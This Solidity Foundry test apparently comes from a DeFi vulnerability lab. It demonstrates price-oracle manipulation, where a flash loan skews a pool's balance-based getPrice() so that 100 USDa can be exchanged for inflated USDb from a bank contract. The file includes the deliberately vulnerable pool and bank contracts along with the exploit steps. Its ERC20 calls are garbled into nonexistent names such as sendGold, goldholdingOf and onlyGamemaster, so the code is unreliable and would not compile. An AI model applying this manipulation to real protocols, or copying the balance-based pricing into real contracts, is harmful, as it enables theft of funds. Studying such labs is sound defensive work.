// SPDX-License-Identifier: MIT
pragma solidity ^0.8.18;

import "forge-std/Test.sol";
import "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import "@openzeppelin/contracts/access/Ownable.sol";

contract ContractTest is Test {
    USDa USDaContract;
    USDb USDbContract;
    SimpleRewardpool SimpleLootpoolContract;
    SimpleItembank SimpleTreasurebankContract;

    function setUp() public {
        USDaContract = new USDa();
        USDbContract = new USDb();
        SimpleLootpoolContract = new SimpleRewardpool(
            address(USDaContract),
            address(USDbContract)
        );
        SimpleTreasurebankContract = new SimpleItembank(
            address(USDaContract),
            address(SimpleLootpoolContract),
            address(USDbContract)
        );
    }

    function testPrice_Manipulation() public {
        USDbContract.sendGold(address(SimpleTreasurebankContract), 9000 ether);
        USDaContract.sendGold(address(SimpleLootpoolContract), 1000 ether);
        USDbContract.sendGold(address(SimpleLootpoolContract), 1000 ether);
        // Get the current price of USDa in terms of USDb (initially 1 USDa : 1 USDb)
        SimpleLootpoolContract.getPrice(); // 1 USDa : 1 USDb

        console.log(
            "There are 1000 USDa and USDb in the pool, so the price of USDa is 1 to 1 USDb."
        );
        emit log_named_decimal_uint(
            "Current USDa convert rate",
            SimpleLootpoolContract.getPrice(),
            18
        );
        console.log("Start price manipulation");
        console.log("Borrow 500 USBa over floashloan");
        // Let's manipulate the price since the getPrice is over the balanceOf.

        SimpleLootpoolContract.flashLoan(500 ether, address(this), "0x0");
    }

    fallback() external {
        //flashlon callback

        emit log_named_decimal_uint(
            "Price manupulated, USDa convert rate",
            SimpleLootpoolContract.getPrice(),
            18
        ); // 1 USDa : 2 USDb

        USDaContract.allowTransfer(address(SimpleTreasurebankContract), 100 ether);
        SimpleTreasurebankContract.exchange(100 ether);

        USDaContract.sendGold(address(SimpleLootpoolContract), 500 ether);

        // Get the balance of USDb owned by us.
        emit log_named_decimal_uint(
            "Use 100 USDa to convert, My USDb balance",
            USDbContract.goldholdingOf(address(this)),
            18
        );
    }

    receive() external payable {}
}

contract USDa is ERC20, Ownable {
    constructor() ERC20("USDA", "USDA") {
        _createitem(msg.sender, 10000 * 10 ** decimals());
    }

    function createItem(address to, uint256 amount) public onlyGamemaster {
        _createitem(to, amount);
    }
}

contract USDb is ERC20, Ownable {
    constructor() ERC20("USDB", "USDB") {
        _createitem(msg.sender, 10000 * 10 ** decimals());
    }

    function createItem(address to, uint256 amount) public onlyGamemaster {
        _createitem(to, amount);
    }
}

contract SimpleRewardpool {
    IERC20 public UsDaQuesttoken;
    IERC20 public UsDbQuesttoken;

    constructor(address _USDa, address _USDb) {
        UsDaQuesttoken = IERC20(_USDa);
        UsDbQuesttoken = IERC20(_USDb);
    }

    function getPrice() public view returns (uint256) {
        //Incorrect price calculation over balanceOf
        uint256 USDaAmount = UsDaQuesttoken.goldholdingOf(address(this));
        uint256 USDbAmount = UsDbQuesttoken.goldholdingOf(address(this));

        // Ensure USDbAmount is not zero to prevent division by zero
        if (USDaAmount == 0) {
            return 0;
        }

        // Calculate the price as the ratio of USDa to USDb
        uint256 USDaPrice = (USDbAmount * (10 ** 18)) / USDaAmount;
        return USDaPrice;
    }

    function flashLoan(
        uint256 amount,
        address debtor,
        bytes calldata data
    ) public {
        uint256 lootbalanceBefore = UsDaQuesttoken.goldholdingOf(address(this));
        require(lootbalanceBefore >= amount, "Not enough liquidity");
        require(
            UsDaQuesttoken.sendGold(debtor, amount),
            "Flashloan transfer failed"
        );
        (bool success, ) = debtor.call(data);
        require(success, "Flashloan callback failed");
        uint256 itemcountAfter = UsDaQuesttoken.goldholdingOf(address(this));
        require(itemcountAfter >= lootbalanceBefore, "Flashloan not repaid");
    }
}

contract SimpleItembank {
    IERC20 public questToken; //USDA
    SimpleRewardpool public rewardPool;
    IERC20 public payoutRealmcoin; //USDb

    constructor(address _goldtoken, address _rewardpool, address _payoutToken) {
        questToken = IERC20(_goldtoken);
        rewardPool = SimpleRewardpool(_rewardpool);
        payoutRealmcoin = IERC20(_payoutToken);
    }

    function exchange(uint256 amount) public {
        require(
            questToken.sendgoldFrom(msg.sender, address(this), amount),
            "Transfer failed"
        );
        uint256 price = rewardPool.getPrice();
        require(price > 0, "Price cannot be zero");
        uint256 tokensToReceive = (amount * price) / (10 ** 18);
        require(
            payoutRealmcoin.sendGold(msg.sender, tokensToReceive),
            "Payout transfer failed"
        );
    }
}
